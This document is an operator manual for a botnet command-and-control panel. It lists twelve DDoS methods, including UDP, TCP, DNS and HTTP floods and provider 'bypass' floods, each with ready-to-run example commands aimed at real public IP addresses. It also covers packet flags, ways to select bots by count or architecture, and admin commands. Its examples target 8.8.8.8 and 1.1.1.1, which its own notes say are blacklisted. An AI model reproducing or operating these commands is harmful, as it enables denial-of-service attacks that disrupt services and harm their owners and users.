# CNC Attack Methods Usage Guide

## Basic Syntax
```
<method> <target> <duration> [flags]
```

## Available Attack Methods

### Layer 4 Attacks

#### 1. **UDP Flood** (`udpflood`)
```
udpflood <target> <duration> [flags]
```
**Example:**
```
udpflood 50.7.22.221 20 dport=53
udpflood 192.168.1.1 30 len=1024 dport=80
```

#### 2. **TCP Flood** (`tcpflood`)
```
tcpflood <target> <duration> [flags]
```
**Example:**
```
tcpflood 50.7.22.221 20 dport=80 syn=1
tcpflood 192.168.1.1 30 len=512 sport=80 dport=443
```

#### 3. **VSE Flood** (`vseflood`) - Valve Source Engine
```
vseflood <target> <duration> [flags]
```
**Example:**
```
vseflood 50.7.22.221 20 dport=53
vseflood 192.168.1.1 30 len=1024 dport=27015
```

#### 4. **DNS Flood** (`dnsflood`)
```
dnsflood <target> <duration> [flags]
```
**Example:**
```
dnsflood 8.8.8.8 20 domain=google.com dport=53
dnsflood 1.1.1.1 30 len=512 domain=example.com
```

#### 5. **ACK Flood** (`ackflood`)
```
ackflood <target> <duration> [flags]
```
**Example:**
```
ackflood 50.7.22.221 20 dport=80 ack=1
ackflood 192.168.1.1 30 len=1024 sport=80 dport=443
```

### Bypass Methods

#### 6. **TCP Bypass** (`tcpbypass`)
```
tcpbypass <target> <duration> [flags]
```
**Example:**
```
tcpbypass 50.7.22.221 20 dport=80 syn=1
tcpbypass 192.168.1.1 30 len=1024 sport=80
```

#### 7. **UDP Bypass** (`udpbypass`)
```
udpbypass <target> <duration> [flags]
```
**Example:**
```
udpbypass 50.7.22.221 20 dport=53
udpbypass 192.168.1.1 30 len=1024 dport=80
```

#### 8. **OVH Bypass** (`ovhbypass`)
```
ovhbypass <target> <duration> [flags]
```
**Example:**
```
ovhbypass 50.7.22.221 20 dport=80
ovhbypass 192.168.1.1 30 len=1024 dport=443
```

### Layer 7 Attacks

#### 9. **HTTP Flood** (`httpflood`)
```
httpflood <target> <duration> [flags]
```
**Example:**
```
httpflood 50.7.22.221 20 domain=http://example.com conns=1000
httpflood 192.168.1.1 30 domain=https://target.com method=POST path=/login
```

#### 10. **Handshake Flood** (`handshake`)
```
handshake <target> <duration> [flags]
```
**Example:**
```
handshake 50.7.22.221 20 dport=22
handshake 192.168.1.1 30 len=1024 dport=443
```

#### 11. **Overflow Attack** (`overflow`)
```
overflow <target> <duration> [flags]
```
**Example:**
```
overflow 50.7.22.221 20 len=65535
overflow 192.168.1.1 30 minlen=1000 maxlen=10000
```

#### 12. **TCP Reset** (`tcpreset`)
```
tcpreset <target> <duration> [flags]
```
**Example:**
```
tcpreset 50.7.22.221 20 dport=80 reset=1
tcpreset 192.168.1.1 30 len=1024 dport=443
```

## Available Flags/Options

### Layer 4 Flags
- `len=<bytes>` - Packet size (default: 512)
- `rand=<0|1>` - Randomize data (default: 1)
- `ttl=<1-255>` - TTL value (default: 255)
- `sport=<port>` - Source port (default: random)
- `dport=<port>` - Destination port (default: random)
- `tos=<value>` - TOS field value
- `ident=<value>` - ID field value
- `df=<0|1>` - Don't Fragment bit
- `urg=<0|1>` - URG bit
- `ack=<0|1>` - ACK bit
- `psh=<0|1>` - PSH bit
- `rst=<0|1>` - RST bit
- `syn=<0|1>` - SYN bit
- `fin=<0|1>` - FIN bit
- `seqnum=<value>` - Sequence number
- `acknum=<value>` - ACK number
- `source=<ip>` - Source IP (255.255.255.255 for random)

### Layer 7 Flags
- `domain=<url>` - Target domain/URL
- `method=<GET|POST>` - HTTP method
- `path=<path>` - HTTP path (default: /)
- `postdata=<data>` - POST data
- `conns=<number>` - Number of connections
- `tls=<0|1>` - SSL/TLS exhaustion

### Special Flags
- `minlen=<bytes>` - Minimum packet length
- `maxlen=<bytes>` - Maximum packet length
- `payload=<data>` - Custom payload
- `repeat=<number>` - Number of repetitions
- `reset=<0|1>` - TCP reset flag

## Bot Targeting

### Target All Bots
```
<method> <target> <duration> [flags]
```

### Target Specific Number of Bots
```
*<number> <method> <target> <duration> [flags]
```
**Example:**
```
*100 tcpflood 50.7.22.221 20 dport=80
```

### Target Specific Bot Category
```
-<category> <method> <target> <duration> [flags]
```
**Example:**
```
-arm tcpflood 50.7.22.221 20 dport=80
```

## Common Usage Examples

### Basic UDP Attack
```
udpflood 50.7.22.221 20 dport=53
```

### TCP SYN Flood
```
tcpflood 50.7.22.221 20 dport=80 syn=1
```

### HTTP GET Flood
```
httpflood 50.7.22.221 20 domain=http://target.com conns=1000
```

### DNS Amplification
```
dnsflood 8.8.8.8 20 domain=google.com dport=53
```

### Large Packet UDP
```
udpflood 50.7.22.221 20 len=1024 dport=80
```

### TCP with Custom Flags
```
tcpflood 50.7.22.221 20 dport=80 syn=1 ack=1 psh=1
```

### HTTP POST Flood
```
httpflood 50.7.22.221 20 domain=https://target.com method=POST path=/login postdata=user=admin&pass=123
```

## Admin Commands

### View Statistics
```
bots          # View bot count and distribution
terminal      # View server statistics
users         # View connected users (admin only)
```

### User Management (Admin Only)
```
adduser       # Add new user
remove        # Remove user
```

### Attack Control (Admin Only)
```
floods enable   # Enable all attacks
floods disable  # Disable all attacks
```

### Help Commands
```
help          # Show help menu
attack        # Show attack methods
flags         # Show available flags
```

## Important Notes

1. **Duration**: Maximum 3600 seconds (1 hour)
2. **Targets**: Cannot attack government domains (.gov, .mil, etc.)
3. **Blacklisted**: 1.1.1.1, 8.8.8.8, and government domains are blocked
4. **Bot Limits**: Users have maximum bot limits
5. **Cooldowns**: Users may have cooldown periods between attacks

## Error Handling

- Invalid commands show error messages
- Blacklisted targets are blocked
- Bot count limits are enforced
- Duration limits are enforced
- Flag validation is performed

## Logging

All commands and attacks are logged to:
- `/root/logs/commands.txt` - Command logs
- `/root/logs/logins.txt` - Login logs
- `/root/logs/adminlogs.txt` - Admin action logs

